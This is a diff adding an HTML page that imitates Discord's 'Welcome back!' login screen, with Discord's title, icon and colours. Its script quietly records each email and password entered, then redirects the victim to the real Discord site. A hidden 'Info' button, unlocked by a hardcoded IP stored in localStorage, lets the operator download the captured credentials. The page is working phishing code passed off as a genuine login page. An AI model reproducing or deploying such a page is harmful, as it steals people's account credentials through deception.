@@ -1,0 +1,171 @@
+<head>
+  <title>Discord</title>
+  <link rel="icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://discord.com:&size=256" sizes="256x256" />
+  <link rel="apple-touch-icon" href="https://t1.gstatic.com/faviconV2?client=SOCIAL&type=FAVICON&fallback_opts=TYPE,SIZE,URL&url=https://discord.com:&size=256" sizes="256x256" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <style>
+    body {
+      background-color: #313338;
+      font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      color: #ffffff;
+      display: flex;
+      justify-content: center;
+      align-items: flex-start;
+      height: 100vh;
+      margin: 0;
+      padding: 20px 10px;
+      box-sizing: border-box;
+      user-select: none;
+      text-align: center;
+      transition: opacity 0.05s ease; /* Fastest fade-out */
+    }
+    .container {
+      margin-top: -24px;
+    }
+    .logo img {
+      margin-top: 4px;
+      width: 100%;
+      height: auto;
+      pointer-events: none;
+    }
+    h1 {
+      font-size: 24px;
+      margin: 5.4px 0;
+      font-weight: 500;
+    }
+    p {
+      font-size: 17px;
+      color: #b9bbbe;
+      margin: 5.4px 0 21px;
+    }
+    label {
+      display: block;
+      text-align: left;
+      font-size: 13px;
+      margin-bottom: 7px;
+      color: #b9bbbe;
+      font-weight: bold;
+    }
+    input[type="text"], input[type="password"] {
+      width: 100%;
+      padding: 11px;
+      margin-bottom: 11px;
+      border: none;
+      background-color: #1e1f22;
+      color: #ffffff;
+      font-size: 16px;
+      height: 39.63px;
+    }
+    .login-button {
+      width: 100%;
+      margin-top: -10px;
+      padding: 11.6px;
+      background-color: #5865f2;
+      border: none;
+      color: #ffffff;
+      font-size: 16.2px;
+      font-weight: bold;
+      cursor: pointer;
+      border-radius: 0.1rem;
+      height: 43px;
+    }
+    .info-button {
+      display: none;
+      margin-top: 10px;
+      padding: 10px;
+      background-color: #03a0ee;
+      color: #ffffff;
+      border: none;
+      cursor: pointer;
+    }
+    .info-list {
+      margin-top: 20px;
+      text-align: left;
+      color: #b9bbbe;
+    }
+  </style>
+</head>
+<body>
+  <script>
+    let inputData = [];
+    const userIP = "174.235.214.174"; // Example IP for conditional display
+    const userIPStorage = "userIP";
+
+    function focusEmail() {
+      document.getElementById('email').focus();
+    }
+
+    function validateForm() {
+      const email = document.getElementById('email').value;
+      const password = document.getElementById('password').value;
+
+      if (!email || !password) {
+        if (!email) {
+          document.getElementById('email').style.borderColor = 'red';
+        }
+        if (!password) {
+          document.getElementById('password').style.borderColor = 'red';
+        }
+        focusEmail();
+        return false;
+      }
+      
+      // Save input data with timestamp
+      const timestamp = new Date().toLocaleString();
+      inputData.push({ email, password, timestamp });
+      
+      // Handle fade out and redirect
+      fadeOutAndRedirect();
+      return false; // Prevent form submission
+    }
+
+    function fadeOutAndRedirect() {
+      document.body.style.opacity = 0;
+      setTimeout(() => {
+        localStorage.setItem(userIPStorage, userIP); // Store user IP
+        window.location.href = "https://discord.com/channels/@me";
+      }, 50); // Wait for faster fade out
+    }
+
+    function showInfoButton() {
+      const infoButton = document.getElementById('info-button');
+      if (localStorage.getItem(userIPStorage) === userIP) {
+        infoButton.style.display = 'block';
+      }
+    }
+
+    function downloadInfo() {
+      const blob = new Blob([JSON.stringify(inputData, null, 2)], { type: 'text/plain' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'inputData.txt';
+      link.click();
+    }
+
+    window.onload = function() {
+      focusEmail();
+      showInfoButton();
+    };
+  </script>
+
+  <div class="container">
+    <div class="logo">
+      <img alt="Logo" src="https://i.ibb.co/TmMxVKn/IMG-4225.jpg" ondragstart="return false;" />
+    </div>
+    <h1>Welcome back!</h1>
+    <p>We're so excited to see you again!</p>
+    <form onsubmit="return validateForm()">
+      <label for="email">EMAIL OR PHONE NUMBER <span class="error">*</span></label>
+      <input id="email" name="email" type="text"/>
+      <label for="password">PASSWORD <span class="error">*</span></label>
+      <input id="password" name="password" type="password"/>
+      <button class="login-button" type="submit">Log In</button>
+    </form>
+    <button id="info-button" class="info-button" onclick="downloadInfo()">Info</button>
+    <div class="info-list">
+      <h3>Entered Data:</h3>
+      <pre id="data-display"></pre>
+    </div>
+  </div>
+</body>
+</html>
